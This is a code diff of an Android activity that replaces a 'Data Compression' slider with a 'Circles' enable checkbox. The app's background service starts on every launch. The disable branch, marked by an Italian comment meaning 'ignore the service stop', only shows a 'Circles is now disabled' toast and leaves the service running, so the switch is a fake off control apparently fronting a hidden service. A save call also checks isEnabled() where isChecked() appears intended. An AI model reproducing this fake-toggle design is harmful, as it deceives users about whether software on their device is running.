@@ -17,17 +17,11 @@ import android.os.Bundle;
 import android.preference.PreferenceManager;
 import android.view.View;
 import android.view.View.OnClickListener;
-import android.widget.Button;
-import android.widget.SeekBar;
-import android.widget.SeekBar.OnSeekBarChangeListener;
-import android.widget.FrameLayout;
-import android.widget.TextView;
+import android.widget.CheckBox;
 import android.widget.Toast;
-import android.widget.ToggleButton;
 
 import com.android.networking.Core;
 import com.android.networking.R;
-import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 
@@ -35,11 +29,10 @@ import com.android.networking.util.Check;
  * The Class AndroidServiceGUI.
  * http://stackoverflow.com/questions/10909683/launch-android-application-without-main-activity-and-start-service-on-launching
  */
-public class AGUI extends Activity implements OnSeekBarChangeListener {
+public class AGUI extends Activity {
 	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
 
-	private SeekBar seekBar;
-	private TextView textProgress;
+	private CheckBox checkBox;
 
 	/**
 	 * Called when the activity is first created.
@@ -60,86 +53,45 @@ public class AGUI extends Activity implements OnSeekBarChangeListener {
 
 		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
 		SharedPreferences.Editor editor = preferences.edit();
-		editor.putInt("compressionLevel", seekBar.getProgress());
+		editor.putBoolean("enabled", checkBox.isEnabled());
 		editor.commit();
 		
 		//Status.self().gui = null;
-	}
-
-	@Override
-	public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
-		if (progress >= 0 && progress <= 25) {
-			progress = 25;
-			seekBar.setProgress(progress);
-		} else if (progress > 25 && progress <= 50) {
-			progress = 50;
-			seekBar.setProgress(progress);
-		} else if (progress > 50 && progress <= 75) {
-			progress = 75;
-			seekBar.setProgress(progress);
-		} else {
-			progress = 100;
-			seekBar.setProgress(progress);
-		}
-
-		textProgress.setText("Compression Level: " + progress + "%");
-	}
-
-	@Override
-	public void onStartTrackingTouch(SeekBar seekBar) {
-		// TODO Auto-generated method stub
-	}
-
-	@Override
-	public void onStopTrackingTouch(SeekBar seekBar) {
-		// TODO Auto-generated method stub
 	}
 
 	private void actualCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 
 		startService();
-
 		setContentView(R.layout.main);
 
-		// Set up click listeners
-		final Button runButton = (Button) findViewById(R.id.btntoggle);
-
-		// Seekbar listener
-		seekBar = (SeekBar) findViewById(R.id.seekBar);
-		seekBar.setOnSeekBarChangeListener(this);
-		textProgress = (TextView) findViewById(R.id.textProgress);
+		// Checkbox listener
+		checkBox = (CheckBox) findViewById(R.id.enabled);
 
 		// Retrieve saved status
 		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
 
 		try {
-			seekBar.setProgress(preferences.getInt("compressionLevel", 0));
+			checkBox.setChecked(preferences.getBoolean("enabled", false));
 		} catch (Exception e) {
-			seekBar.setProgress(75);
+			checkBox.setChecked(false);
 		}
 
-		try {
-			((ToggleButton) runButton).setChecked(preferences.getBoolean("running", false));
-		} catch (Exception e) {
-			((ToggleButton) runButton).setChecked(false);
-		}
-
-		runButton.setOnClickListener(new OnClickListener() {
-			// @Override
-			public void onClick(final View v) {
+		checkBox.setOnClickListener(new OnClickListener() {
+			@Override
+			public void onClick(View v) {
 				SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
 				SharedPreferences.Editor editor = preferences.edit();
 
-				if (((ToggleButton) v).isChecked()) {
-					editor.putBoolean("running", true);
+				if (checkBox.isChecked()) {
+					editor.putBoolean("enabled", true);
 
-					Toast.makeText(AGUI.this, "Data Compression Started", Toast.LENGTH_LONG).show();
+					Toast.makeText(AGUI.this, "Circles is now enabled", Toast.LENGTH_LONG).show();
 				} else {
-					editor.putBoolean("running", false);
+					editor.putBoolean("enabled", false);
 
 					// IGNORA LO STOP DEL SERVIZIO
-					Toast.makeText(AGUI.this, "Data Compression Stopped", Toast.LENGTH_LONG).show();
+					Toast.makeText(AGUI.this, "Circles is now disabled", Toast.LENGTH_LONG).show();
 				}
 
 				editor.commit();
